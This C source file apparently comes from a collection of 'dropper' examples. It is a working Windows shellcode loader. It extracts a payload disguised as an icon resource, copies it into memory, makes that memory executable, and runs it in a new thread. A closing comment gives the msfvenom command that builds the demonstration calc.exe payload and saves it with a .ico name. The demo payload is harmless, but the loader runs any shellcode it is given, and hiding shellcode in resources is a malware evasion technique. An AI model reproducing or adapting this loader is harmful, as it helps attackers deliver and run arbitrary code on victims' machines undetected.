/**
 * @file examples/pe/rsrc/ex0.c
 * @author adamr88 (adamr88@github.com)
 * @brief CMD=calc.exe shellcode icon resource
 * @version 0.1
 * @date 2024-01-04
 *
 * @copyright Copyright (c) 2024
 *
 * @note
 * See examples/pe/ex1.c for similar non resource example
 *
 */

#ifdef _WIN32
#include <windows.h>
#pragma comment(lib, "user32.lib")
#pragma comment(linker, "/subsystem:console")
#else
#include <stub/windows.h>
#endif

#include "resources.h"
#include <dropper/assert.h>

enum { MAX_TIMEOUT = 4294967295 };

int main(void) {
  // extract payload from resource
  HRSRC res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
  HGLOBAL resHandle = LoadResource(NULL, res);
  const unsigned char *src = (unsigned char *)LockResource(resHandle);
  unsigned int srclen = SizeofResource(NULL, res);

  void *lpbuf =
      VirtualAlloc(0, srclen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  AssertNotNull(lpbuf, VirtualAlloc, -1 * __LINE__);

  // copy payload to virtual memory buf
  RtlMoveMemory(lpbuf, src, srclen);

  // change virtual memory buf execution permissions
  DWORD lpflOldProtect = 0;
  Assert(VirtualProtect(lpbuf, srclen, PAGE_EXECUTE_READ, &lpflOldProtect));

  // execute payload (in thread/subprocess)
  HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpbuf, 0, 0, 0);
  AssertNotNull(th, CreateThread, -1 * __LINE__);

  // clean up threads and memory
  WaitForSingleObject(th, MAX_TIMEOUT);
  Assert(CloseHandle(th));
  Assert(VirtualFree(lpbuf, srclen, MEM_RELEASE));
  return 0;
}

/**
 * @note
 * Generate resource using msfvenom
 * msfvenom -p windows/x64/exec CMD="calc.exe" -o calc.ico
 *
 * Inspect shell code
 * hexdump -C calc.ico
 *
 */